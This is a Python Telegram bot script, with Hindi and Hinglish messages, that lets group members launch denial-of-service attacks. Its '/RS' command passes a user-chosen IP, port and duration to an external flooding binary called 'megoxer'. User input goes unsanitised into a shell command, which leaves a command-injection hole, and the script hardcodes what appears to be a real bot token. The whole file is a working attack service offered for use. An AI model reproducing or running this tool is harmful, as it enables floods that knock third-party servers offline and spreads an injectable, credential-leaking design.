#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading

# TELEGRAM BOT TOKEN
bot = telebot.TeleBot('8111473127:AAERRgnT8TW3fAw_cf_E2FM5zD8j4ae10k8')

# GROUP AND CHANNEL DETAILS
GROUP_ID = "-1002369239894"
CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
ADMINS = [7129010361]

# GLOBAL VARIABLES
active_attacks = {}  # Track active attacks per user
verified_users = set()
user_attack_count = {}

# FUNCTION TO CHECK IF USER IS IN CHANNEL
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# SCREENSHOT VERIFICATION FUNCTION (UPDATED)
def verify_screenshot(user_id, message):
    verified_users.add(user_id)
    
    # यूज़र की डिटेल्स लो
    user_info = f"👤 **FREE USER:** `{message.from_user.first_name}`\n"
    user_info += f"🆔 **USER ID:** `{user_id}`\n"
    if message.from_user.username:
        user_info += f"📛 **USERNAME:** @{message.from_user.username}\n"

    # पहले यूज़र की डिटेल्स भेजो
    bot.send_message(SCREENSHOT_CHANNEL, f"📸 **NEW SCREENSHOT RECEIVED!**\n\n{user_info}", parse_mode="Markdown")
    
    # फिर स्क्रीनशॉट फॉरवर्ड करो
    bot.forward_message(SCREENSHOT_CHANNEL, message.chat.id, message.message_id)

    # यूज़र को कन्फर्मेशन भेजो
    bot.reply_to(message, "✅ SCREENSHOT VERIFIED! AB ATTACK KAR SAKTA HAI!")

# HANDLE SCREENSHOT SUBMISSION
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = message.from_user.id
    verify_screenshot(user_id, message)

# HANDLE ATTACK COMMAND
@bot.message_handler(commands=['RS'])
def handle_attack(message):
    user_id = message.from_user.id
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 **YE BOT SIRF GROUP ME CHALEGA!** ❌")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ **PEHLE CHANNEL JOIN KARO!** {CHANNEL_USERNAME}")
        return

    if user_id not in verified_users:
        bot.reply_to(message, "❌ **SCREENSHOT BHEJ BSDK, TABHI ATTACK KAR SAKTA HAI!**")
        return

    if user_id in active_attacks:
        bot.reply_to(message, "⚠️ **EK TIME MAIN 1 HI ATTACK ALLOWED HAI!**\n👉 **PURANA KHATAM HONE DO! `/check` KARO!**")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ **USAGE:** `/RS <IP> <PORT> <TIME>`")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **PORT AUR TIME NUMBER HONE CHAHIYE!**")
        return

    if time_duration > 120:
        bot.reply_to(message, "🚫 **120S SE ZYADA ALLOWED NAHI HAI!**")
        return

    start_time = datetime.datetime.now()
    end_time = start_time + datetime.timedelta(seconds=time_duration)
    active_attacks[user_id] = [(target, port, end_time)]  # ✅ अटैक ट्रैक होगा

    bot.send_message(
        message.chat.id,
        f"🔥 **ATTACK DETAILS** 🔥\n\n"
        f"👤 **USER:** `{user_id}`\n"
        f"🎯 **TARGET:** `{target}`\n"
        f"📍 **PORT:** `{port}`\n"
        f"⏳ **DURATION:** `{time_duration} SECONDS`\n"
        f"🕒 **START TIME:** `{start_time.strftime('%H:%M:%S')}`\n"
        f"🚀 **END TIME:** `{end_time.strftime('%H:%M:%S')}`\n\n"
        f"⚠️ **ATTACK CHALU HAI! `/check` KARKE STATUS DEKHO!**",
        parse_mode="Markdown"
    )

    # **Attack Execution**
    def attack_execution():
        try:
            subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True, timeout=time_duration)
        except subprocess.CalledProcessError:
            bot.reply_to(message, "❌ **ATTACK FAIL HO GAYA!**")
        finally:
            bot.send_message(
                message.chat.id,
                "✅ **ATTACK KHATAM HO GAYA!** 🎯\n"
                "📸 **AB TURANT SCREENSHOT BHEJ, WARNA AGLA ATTACK NAHI LAGEGA!**",
                parse_mode="Markdown"
            )
            verified_users.discard(user_id)  # ✅ अटैक खत्म होने के बाद वेरिफिकेशन हटाओ
            del active_attacks[user_id]  # ✅ अटैक खत्म होते ही डेटा क्लियर

    threading.Thread(target=attack_execution).start()

# ADMIN RESTART COMMAND (ONLY ADMINS)
@bot.message_handler(commands=['restart'])
def restart_bot(message):
    if message.from_user.id in ADMINS:
        bot.send_message(message.chat.id, "♻️ BOT RESTART HO RAHA HAI...")
        time.sleep(1)
        subprocess.run("python3 m.py", shell=True)
    else:
        bot.reply_to(message, "🚫 SIRF ADMIN HI RESTART KAR SAKTA HAI!")

# ✅ /STATS Command - Shows Only Active Attacks
@bot.message_handler(commands=['check'])
def attack_stats(message):
    user_id = message.from_user.id
    now = datetime.datetime.now()

    # ✅ खत्म हुए अटैक हटाओ
    for user in list(active_attacks.keys()):
        active_attacks[user] = [attack for attack in active_attacks[user] if attack[2] > now]
        if not active_attacks[user]:  
            del active_attacks[user]

    if not active_attacks:
        bot.reply_to(message, "📊 **FILHAAL KOI ACTIVE ATTACK NAHI CHAL RAHA!** ❌")
        return

    stats_message = "📊 **ACTIVE ATTACKS:**\n\n"

    for user, attacks in active_attacks.items():
        stats_message += f"👤 **USER ID:** `{user}`\n"
        for target, port, end_time in attacks:
            remaining_time = (end_time - now).total_seconds()
            stats_message += (
                f"🎯 **TARGET:** `{target}`\n"
                f"📍 **PORT:** `{port}`\n"
                f"⏳ **ENDS IN:** `{int(remaining_time)}s`\n"
                f"🕒 **END TIME:** `{end_time.strftime('%H:%M:%S')}`\n\n"
            )

    bot.reply_to(message, stats_message, parse_mode="Markdown")

# START POLLING
bot.polling(none_stop=True)